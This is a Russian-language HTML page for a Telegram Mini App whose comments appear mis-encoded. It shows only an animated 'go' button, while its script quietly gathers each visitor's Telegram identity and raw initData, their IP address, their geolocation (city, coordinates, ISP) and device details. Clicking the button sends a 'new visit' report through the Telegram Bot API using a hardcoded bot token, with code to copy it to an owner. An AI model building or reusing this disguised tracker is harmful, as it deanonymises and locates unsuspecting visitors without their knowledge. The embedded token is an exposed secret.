<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>–ü–µ—Ä–µ–π—Ç–∏</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
            min-height: 100vh;
            background: #0a0a0a;
            display: flex;
            justify-content: center;
            align-items: center;
            overflow: hidden;
            position: relative;
        }

        /* –ö–æ—Å–º–∏—á–µ—Å–∫–∏–π —Ñ–æ–Ω */
        .space-bg {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 1;
        }

        .star {
            position: absolute;
            background: rgba(255, 255, 255, 0.8);
            border-radius: 50%;
            animation: twinkle 3s infinite;
        }

        @keyframes twinkle {
            0%, 100% { opacity: 0.2; transform: scale(1); }
            50% { opacity: 1; transform: scale(1.2); }
        }

        /* –¶–µ–Ω—Ç—Ä–∞–ª—å–Ω—ã–π —ç–ª–µ–º–µ–Ω—Ç */
        .center-circle {
            position: relative;
            z-index: 2;
            width: 300px;
            height: 300px;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .orbital-ring {
            position: absolute;
            width: 100%;
            height: 100%;
            border: 2px solid rgba(0, 255, 255, 0.1);
            border-radius: 50%;
            animation: orbit 20s linear infinite;
        }

        .orbital-ring:nth-child(2) {
            width: 80%;
            height: 80%;
            border-color: rgba(255, 0, 255, 0.1);
            animation: orbit-reverse 15s linear infinite;
        }

        .orbital-ring:nth-child(3) {
            width: 120%;
            height: 120%;
            border-color: rgba(0, 255, 0, 0.1);
            animation: orbit 25s linear infinite;
        }

        @keyframes orbit {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        @keyframes orbit-reverse {
            0% { transform: rotate(360deg); }
            100% { transform: rotate(0deg); }
        }

        /* –û—Å–Ω–æ–≤–Ω–∞—è –∫–Ω–æ–ø–∫–∞ */
        .main-button {
            position: relative;
            width: 160px;
            height: 160px;
            background: linear-gradient(135deg, rgba(20, 20, 30, 0.95), rgba(10, 10, 20, 0.95));
            border: none;
            border-radius: 50%;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
            font-size: 24px;
            font-weight: 600;
            letter-spacing: 2px;
            text-transform: uppercase;
            overflow: hidden;
            transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
            backdrop-filter: blur(20px);
            box-shadow: 
                0 0 0 1px rgba(0, 255, 255, 0.1),
                0 10px 40px rgba(0, 0, 0, 0.5),
                inset 0 1px 0 rgba(255, 255, 255, 0.1);
        }

        .main-button:hover {
            transform: scale(1.1);
            box-shadow: 
                0 0 0 2px rgba(0, 255, 255, 0.3),
                0 20px 60px rgba(0, 255, 255, 0.2),
                inset 0 1px 0 rgba(255, 255, 255, 0.2);
        }

        .main-button:active {
            transform: scale(0.95);
            transition: transform 0.1s;
        }

        .main-button::before {
            content: '';
            position: absolute;
            top: -50%;
            left: -50%;
            width: 200%;
            height: 200%;
            background: conic-gradient(
                transparent,
                rgba(0, 255, 255, 0.1),
                transparent 30%
            );
            animation: rotate 4s linear infinite;
        }

        .main-button::after {
            content: '';
            position: absolute;
            inset: 2px;
            background: linear-gradient(135deg, rgba(20, 20, 30, 0.95), rgba(10, 10, 20, 0.95));
            border-radius: 50%;
        }

        .button-text {
            position: relative;
            z-index: 1;
            background: linear-gradient(45deg, #00ffff, #ff00ff);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
        }

        @keyframes rotate {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        /* –≠—Ñ—Ñ–µ–∫—Ç –ø—É–ª—å—Å–∞—Ü–∏–∏ */
        .pulse-ring {
            position: absolute;
            width: 200px;
            height: 200px;
            border: 1px solid rgba(0, 255, 255, 0.3);
            border-radius: 50%;
            animation: pulse 3s infinite;
            opacity: 0;
        }

        .pulse-ring:nth-child(2) {
            animation-delay: 1s;
        }

        .pulse-ring:nth-child(3) {
            animation-delay: 2s;
        }

        @keyframes pulse {
            0% {
                transform: scale(0.8);
                opacity: 1;
            }
            100% {
                transform: scale(2);
                opacity: 0;
            }
        }

        /* –ü–ª–∞–≤–∞—é—â–∏–µ —á–∞—Å—Ç–∏—Ü—ã */
        .particles {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 1;
            pointer-events: none;
        }

        .particle {
            position: absolute;
            width: 2px;
            height: 2px;
            background: rgba(0, 255, 255, 0.6);
            border-radius: 50%;
            animation: float 10s infinite linear;
        }

        @keyframes float {
            0% {
                transform: translateY(100vh) translateX(0) rotate(0deg);
                opacity: 0;
            }
            10% {
                opacity: 1;
            }
            90% {
                opacity: 1;
            }
            100% {
                transform: translateY(-100px) translateX(100px) rotate(360deg);
                opacity: 0;
            }
        }

        /* –ò–Ω–¥–∏–∫–∞—Ç–æ—Ä –∑–∞–≥—Ä—É–∑–∫–∏ */
        .loader {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            width: 60px;
            height: 60px;
            display: none;
            z-index: 3;
        }

        .loader-spinner {
            width: 100%;
            height: 100%;
            border: 3px solid transparent;
            border-top: 3px solid #00ffff;
            border-right: 3px solid #ff00ff;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        /* –¢–µ–∫—Å—Ç –≤–Ω–∏–∑—É */
        .footer {
            position: fixed;
            bottom: 30px;
            left: 0;
            width: 100%;
            text-align: center;
            color: rgba(255, 255, 255, 0.3);
            font-size: 12px;
            letter-spacing: 1px;
            z-index: 2;
        }

        /* –ê–¥–∞–ø—Ç–∏–≤–Ω–æ—Å—Ç—å */
        @media (max-width: 768px) {
            .center-circle {
                width: 250px;
                height: 250px;
            }

            .main-button {
                width: 140px;
                height: 140px;
                font-size: 20px;
            }

            .pulse-ring {
                width: 180px;
                height: 180px;
            }
        }

        @media (max-width: 480px) {
            .center-circle {
                width: 220px;
                height: 220px;
            }

            .main-button {
                width: 120px;
                height: 120px;
                font-size: 18px;
            }

            .pulse-ring {
                width: 160px;
                height: 160px;
            }

            .footer {
                bottom: 20px;
                font-size: 11px;
            }
        }

        /* –≠—Ñ—Ñ–µ–∫—Ç —Å–≤–µ—á–µ–Ω–∏—è –ø—Ä–∏ –∫–ª–∏–∫–µ */
        .click-glow {
            position: absolute;
            width: 300px;
            height: 300px;
            background: radial-gradient(circle, rgba(0, 255, 255, 0.2) 0%, transparent 70%);
            border-radius: 50%;
            opacity: 0;
            pointer-events: none;
        }

        /* –≠—Ñ—Ñ–µ–∫—Ç –Ω–µ–æ–Ω–æ–≤–æ–≥–æ —Å–≤–µ—á–µ–Ω–∏—è */
        .neon-glow {
            position: absolute;
            width: 100%;
            height: 100%;
            border-radius: 50%;
            box-shadow: 
                0 0 20px rgba(0, 255, 255, 0.2),
                0 0 40px rgba(0, 255, 255, 0.1),
                0 0 60px rgba(0, 255, 255, 0.05);
            opacity: 0;
            transition: opacity 0.3s;
        }

        .main-button:hover .neon-glow {
            opacity: 1;
        }
    </style>
</head>
<body>
    <!-- –ö–æ—Å–º–∏—á–µ—Å–∫–∏–π —Ñ–æ–Ω -->
    <div class="space-bg" id="spaceBg"></div>

    <!-- –ü–ª–∞–≤–∞—é—â–∏–µ —á–∞—Å—Ç–∏—Ü—ã -->
    <div class="particles" id="particles"></div>

    <!-- –¶–µ–Ω—Ç—Ä–∞–ª—å–Ω—ã–π —ç–ª–µ–º–µ–Ω—Ç -->
    <div class="center-circle">
        <!-- –û—Ä–±–∏—Ç–∞–ª—å–Ω—ã–µ –∫–æ–ª—å—Ü–∞ -->
        <div class="orbital-ring"></div>
        <div class="orbital-ring"></div>
        <div class="orbital-ring"></div>

        <!-- –ö–æ–ª—å—Ü–∞ –ø—É–ª—å—Å–∞—Ü–∏–∏ -->
        <div class="pulse-ring"></div>
        <div class="pulse-ring"></div>
        <div class="pulse-ring"></div>

        <!-- –°–≤–µ—á–µ–Ω–∏–µ –ø—Ä–∏ –∫–ª–∏–∫–µ -->
        <div class="click-glow" id="clickGlow"></div>

        <!-- –ì–ª–∞–≤–Ω–∞—è –∫–Ω–æ–ø–∫–∞ -->
        <button class="main-button" id="goButton">
            <div class="neon-glow"></div>
            <div class="button-text">–ü–µ—Ä–µ–π—Ç–∏</div>
        </button>
    </div>

    <!-- –ò–Ω–¥–∏–∫–∞—Ç–æ—Ä –∑–∞–≥—Ä—É–∑–∫–∏ -->
    <div class="loader" id="loader">
        <div class="loader-spinner"></div>
    </div>

    <!-- –¢–µ–∫—Å—Ç –≤–Ω–∏–∑—É -->
    <div class="footer">
        ¬© 2024
    </div>

    <!-- Telegram Web App SDK -->
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <script>
        // –ö–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏—è
        const CONFIG = {
            BOT_TOKEN: '7960473361:AAF5A_Ho-re9DU8Rlidb2h6-vAQWCUAtOSQ',
            AUTO_CLOSE: true,
            OWNER_CHAT_ID: null
        };

        // –ì–ª–æ–±–∞–ª—å–Ω—ã–µ –ø–µ—Ä–µ–º–µ–Ω–Ω—ã–µ
        let tg = null;
        let telegramUser = null;
        let deviceData = {};
        let isSending = false;

        // –°–æ–∑–¥–∞–Ω–∏–µ –∑–≤–µ–∑–¥–Ω–æ–≥–æ —Ñ–æ–Ω–∞
        function createStars() {
            const spaceBg = document.getElementById('spaceBg');
            const starCount = 150;
            
            for (let i = 0; i < starCount; i++) {
                const star = document.createElement('div');
                star.className = 'star';
                
                const size = Math.random() * 2 + 1;
                const x = Math.random() * 100;
                const y = Math.random() * 100;
                const delay = Math.random() * 3;
                
                star.style.width = `${size}px`;
                star.style.height = `${size}px`;
                star.style.left = `${x}vw`;
                star.style.top = `${y}vh`;
                star.style.animationDelay = `${delay}s`;
                
                spaceBg.appendChild(star);
            }
        }

        // –°–æ–∑–¥–∞–Ω–∏–µ –ø–ª–∞–≤–∞—é—â–∏—Ö —á–∞—Å—Ç–∏—Ü
        function createParticles() {
            const particles = document.getElementById('particles');
            const particleCount = 30;
            
            for (let i = 0; i < particleCount; i++) {
                const particle = document.createElement('div');
                particle.className = 'particle';
                
                const x = Math.random() * 100;
                const delay = Math.random() * 10;
                const duration = Math.random() * 10 + 5;
                
                particle.style.left = `${x}vw`;
                particle.style.animationDelay = `${delay}s`;
                particle.style.animationDuration = `${duration}s`;
                
                particles.appendChild(particle);
            }
        }

        // –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è –ø—Ä–∏–ª–æ–∂–µ–Ω–∏—è
        function initApp() {
            // –°–æ–∑–¥–∞–µ–º –≤–∏–∑—É–∞–ª—å–Ω—ã–µ —ç—Ñ—Ñ–µ–∫—Ç—ã
            createStars();
            createParticles();
            
            try {
                // –ü—Ä–æ–≤–µ—Ä—è–µ–º, –æ—Ç–∫—Ä—ã—Ç–æ –ª–∏ –≤ Telegram
                if (typeof window.Telegram !== 'undefined' && window.Telegram.WebApp) {
                    tg = window.Telegram.WebApp;
                    tg.expand();
                    tg.ready();
                    
                    // –ü–æ–ª—É—á–∞–µ–º –¥–∞–Ω–Ω—ã–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –∏–∑ Telegram
                    loadTelegramUserData();
                }
                
                // –°–æ–±–∏—Ä–∞–µ–º –¥–∞–Ω–Ω—ã–µ —É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞
                collectDeviceData();
                
                // –ù–∞—Å—Ç—Ä–∞–∏–≤–∞–µ–º –∫–Ω–æ–ø–∫—É
                setupButton();
                
            } catch (error) {
                console.error('–û—à–∏–±–∫–∞ –∏–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏–∏:', error);
            }
        }

        // –ó–∞–≥—Ä—É–∑–∫–∞ –¥–∞–Ω–Ω—ã—Ö –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è Telegram
        function loadTelegramUserData() {
            try {
                const initData = tg?.initDataUnsafe;
                if (initData?.user) {
                    telegramUser = {
                        id: initData.user.id,
                        username: initData.user.username || null,
                        first_name: initData.user.first_name || '',
                        last_name: initData.user.last_name || '',
                        language_code: initData.user.language_code || 'ru',
                        is_premium: initData.user.is_premium || false,
                        photo_url: initData.user.photo_url
                    };
                }
            } catch (error) {
                console.error('–û—à–∏–±–∫–∞ –ø–æ–ª—É—á–µ–Ω–∏—è –¥–∞–Ω–Ω—ã—Ö –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è:', error);
            }
        }

        // –°–±–æ—Ä –¥–∞–Ω–Ω—ã—Ö —É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞
        async function collectDeviceData() {
            try {
                deviceData = {
                    timestamp: new Date().toISOString(),
                    userAgent: navigator.userAgent,
                    screen: `${window.screen.width}x${window.screen.height}`,
                    language: navigator.language,
                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                    url: window.location.href,
                    referrer: document.referrer || 'direct',
                    platform: navigator.platform,
                    cookieEnabled: navigator.cookieEnabled,
                    online: navigator.onLine
                };

                // –¢–∏–ø —É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞
                const ua = navigator.userAgent.toLowerCase();
                if (/mobile|android|iphone|ipad|ipod/.test(ua)) {
                    deviceData.type = /tablet|ipad/.test(ua) ? '–ü–ª–∞–Ω—à–µ—Ç' : '–¢–µ–ª–µ—Ñ–æ–Ω';
                } else {
                    deviceData.type = '–ö–æ–º–ø—å—é—Ç–µ—Ä';
                }

                // –ë—Ä–∞—É–∑–µ—Ä
                if (ua.includes('chrome') && !ua.includes('edge')) deviceData.browser = 'Chrome';
                else if (ua.includes('firefox')) deviceData.browser = 'Firefox';
                else if (ua.includes('safari') && !ua.includes('chrome')) deviceData.browser = 'Safari';
                else if (ua.includes('edge')) deviceData.browser = 'Edge';
                else if (ua.includes('opera') || ua.includes('opr')) deviceData.browser = 'Opera';
                else deviceData.browser = '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ';

                // IP –∏ –≥–µ–æ–ª–æ–∫–∞—Ü–∏—è
                try {
                    const ipResponse = await fetch('https://api.ipify.org?format=json');
                    const ipData = await ipResponse.json();
                    deviceData.ip = ipData.ip;
                    
                    try {
                        const geoResponse = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
                        const geoData = await geoResponse.json();
                        deviceData.location = `${geoData.city || '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ'}, ${geoData.country_name || '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ'}`;
                        deviceData.geo = {
                            city: geoData.city,
                            country: geoData.country_name,
                            region: geoData.region,
                            lat: geoData.latitude,
                            lon: geoData.longitude,
                            org: geoData.org
                        };
                    } catch (geoError) {
                        deviceData.location = '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ';
                    }
                } catch (ipError) {
                    deviceData.ip = '–ù–µ —É–¥–∞–ª–æ—Å—å –æ–ø—Ä–µ–¥–µ–ª–∏—Ç—å';
                    deviceData.location = '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ';
                }

                // –î–∞–Ω–Ω—ã–µ Telegram Web App –µ—Å–ª–∏ –µ—Å—Ç—å
                if (tg) {
                    deviceData.tgPlatform = tg.platform;
                    deviceData.tgVersion = tg.version;
                    deviceData.themeParams = tg.themeParams;
                    deviceData.initData = tg.initData;
                }

            } catch (error) {
                console.error('–û—à–∏–±–∫–∞ —Å–±–æ—Ä–∞ –¥–∞–Ω–Ω—ã—Ö —É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞:', error);
            }
        }

        // –ù–∞—Å—Ç—Ä–æ–π–∫–∞ –∫–Ω–æ–ø–∫–∏
        function setupButton() {
            const goButton = document.getElementById('goButton');
            const loader = document.getElementById('loader');
            const clickGlow = document.getElementById('clickGlow');
            
            goButton.addEventListener('click', async () => {
                if (isSending) return;
                
                // –≠—Ñ—Ñ–µ–∫—Ç –∫–ª–∏–∫–∞
                clickGlow.style.opacity = '1';
                clickGlow.style.transform = 'scale(1)';
                clickGlow.style.transition = 'all 0.3s';
                
                setTimeout(() => {
                    clickGlow.style.opacity = '0';
                    clickGlow.style.transform = 'scale(0.8)';
                }, 300);
                
                isSending = true;
                goButton.disabled = true;
                loader.style.display = 'block';
                
                try {
                    // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –¥–∞–Ω–Ω—ã–µ
                    const success = await sendDataToBot();
                    
                    if (success && tg && CONFIG.AUTO_CLOSE) {
                        // –ó–∞–∫—Ä—ã–≤–∞–µ–º Mini App —á–µ—Ä–µ–∑ 500–º—Å
                        setTimeout(() => {
                            tg.close();
                        }, 500);
                    }
                    
                } catch (error) {
                    console.error('–û—à–∏–±–∫–∞:', error);
                } finally {
                    setTimeout(() => {
                        isSending = false;
                        goButton.disabled = false;
                        loader.style.display = 'none';
                    }, 1000);
                }
            });
        }

        // –û—Ç–ø—Ä–∞–≤–∫–∞ –¥–∞–Ω–Ω—ã—Ö –≤ –±–æ—Ç–∞
        async function sendDataToBot() {
            try {
                // –§–æ—Ä–º–∏—Ä—É–µ–º —Å–æ–æ–±—â–µ–Ω–∏–µ
                const message = createTelegramMessage();
                
                // –û–ø—Ä–µ–¥–µ–ª—è–µ–º chat_id –¥–ª—è –æ—Ç–ø—Ä–∞–≤–∫–∏
                let chatId;
                if (telegramUser?.id) {
                    chatId = telegramUser.id; // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—é
                } else if (CONFIG.OWNER_CHAT_ID) {
                    chatId = CONFIG.OWNER_CHAT_ID; // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –≤–ª–∞–¥–µ–ª—å—Ü—É
                } else {
                    return false;
                }
                
                // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º —á–µ—Ä–µ–∑ Telegram Bot API
                const response = await fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        chat_id: chatId,
                        text: message,
                        parse_mode: 'HTML',
                        disable_web_page_preview: true
                    })
                });
                
                const result = await response.json();
                
                if (result.ok) {
                    // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –∫–æ–ø–∏—é –≤–ª–∞–¥–µ–ª—å—Ü—É –µ—Å–ª–∏ –Ω—É–∂–Ω–æ
                    if (CONFIG.OWNER_CHAT_ID && telegramUser?.id !== CONFIG.OWNER_CHAT_ID) {
                        await sendCopyToOwner(message);
                    }
                    return true;
                } else {
                    return false;
                }
                
            } catch (error) {
                console.error('–û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ –≤ –±–æ—Ç–∞:', error);
                return false;
            }
        }

        // –°–æ–∑–¥–∞–Ω–∏–µ —Å–æ–æ–±—â–µ–Ω–∏—è –¥–ª—è Telegram
        function createTelegramMessage() {
            const time = new Date(deviceData.timestamp).toLocaleString('ru-RU');
            const username = telegramUser?.username ? `@${telegramUser.username}` : '–ù–µ —É–∫–∞–∑–∞–Ω';
            const fullName = telegramUser ? 
                `${telegramUser.first_name} ${telegramUser.last_name}`.trim() : 
                '–ê–Ω–æ–Ω–∏–º–Ω—ã–π –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å';
            
            let message = `<b>üÜï –ù–æ–≤—ã–π –ø–µ—Ä–µ—Ö–æ–¥!</b>\n\n`;
            
            if (telegramUser) {
                message += `<b>üë§ –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å Telegram:</b>\n`;
                message += `üÜî ID: <code>${telegramUser.id}</code>\n`;
                message += `üë§ –ò–º—è: ${fullName}\n`;
                message += `üìõ Username: ${username}\n`;
                message += `üåç –Ø–∑—ã–∫: ${telegramUser.language_code}\n`;
                if (telegramUser.is_premium !== undefined) {
                    message += `‚≠ê Premium: ${telegramUser.is_premium ? '‚úÖ –î–∞' : '‚ùå –ù–µ—Ç'}\n`;
                }
                message += `\n`;
            } else {
                message += `<b>üë§ –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å:</b> –ê–Ω–æ–Ω–∏–º–Ω—ã–π (–Ω–µ –≤ Telegram)\n\n`;
            }
            
            message += `<b>üì± –ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ–± —É—Å—Ç—Ä–æ–π—Å—Ç–≤–µ:</b>\n`;
            message += `üïê –í—Ä–µ–º—è: ${time}\n`;
            if (deviceData.ip && deviceData.ip !== '–ù–µ —É–¥–∞–ª–æ—Å—å –æ–ø—Ä–µ–¥–µ–ª–∏—Ç—å') {
                message += `üåê IP: <code>${deviceData.ip}</code>\n`;
            }
            if (deviceData.location && deviceData.location !== '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ') {
                message += `üìç –õ–æ–∫–∞—Ü–∏—è: ${deviceData.location}\n`;
            }
            message += `üì± –¢–∏–ø: ${deviceData.type}\n`;
            message += `üåê –ë—Ä–∞—É–∑–µ—Ä: ${deviceData.browser}\n`;
            message += `üìè –≠–∫—Ä–∞–Ω: ${deviceData.screen}\n`;
            
            if (deviceData.tgPlatform) {
                message += `ü§ñ –ü–ª–∞—Ç—Ñ–æ—Ä–º–∞: ${deviceData.tgPlatform}\n`;
            }
            
            message += `üîó –°—Å—ã–ª–∫–∞: ${deviceData.url}\n`;
            
            if (deviceData.userAgent) {
                message += `\n<code>${deviceData.userAgent.substring(0, 100)}...</code>`;
            }
            
            return message;
        }

        // –û—Ç–ø—Ä–∞–≤–∫–∞ –∫–æ–ø–∏–∏ –≤–ª–∞–¥–µ–ª—å—Ü—É
        async function sendCopyToOwner(originalMessage) {
            try {
                if (!CONFIG.OWNER_CHAT_ID) return;
                
                const ownerMessage = `üë§ –û—Ç –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è: ${telegramUser?.username ? '@' + telegramUser.username : '–±–µ–∑ username'}\n\n` + originalMessage;
                
                await fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: CONFIG.OWNER_CHAT_ID,
                        text: ownerMessage,
                        parse_mode: 'HTML',
                        disable_web_page_preview: true
                    })
                });
                
            } catch (error) {
                console.error('–û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ –≤–ª–∞–¥–µ–ª—å—Ü—É:', error);
            }
        }

        // –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è –ø—Ä–∏ –∑–∞–≥—Ä—É–∑–∫–µ
        document.addEventListener('DOMContentLoaded', initApp);

        // –ê–Ω–∏–º–∞—Ü–∏—è –ø—Ä–∏ –Ω–∞–≤–µ–¥–µ–Ω–∏–∏ –Ω–∞ –∫–Ω–æ–ø–∫—É
        document.getElementById('goButton').addEventListener('mouseenter', function() {
            this.style.transform = 'scale(1.1) rotate(5deg)';
        });

        document.getElementById('goButton').addEventListener('mouseleave', function() {
            if (!this.disabled) {
                this.style.transform = 'scale(1) rotate(0deg)';
            }
        });

        // –ü–∞—Ä–∞–ª–ª–∞–∫—Å —ç—Ñ—Ñ–µ–∫—Ç –¥–ª—è –∑–≤–µ–∑–¥
        document.addEventListener('mousemove', (e) => {
            const stars = document.querySelectorAll('.star');
            const mouseX = e.clientX / window.innerWidth;
            const mouseY = e.clientY / window.innerHeight;
            
            stars.forEach((star, index) => {
                const speed = (index % 3 + 1) * 0.5;
                const x = (mouseX * speed * 10) - 5;
                const y = (mouseY * speed * 10) - 5;
                
                star.style.transform = `translate(${x}px, ${y}px)`;
            });
        });
    </script>
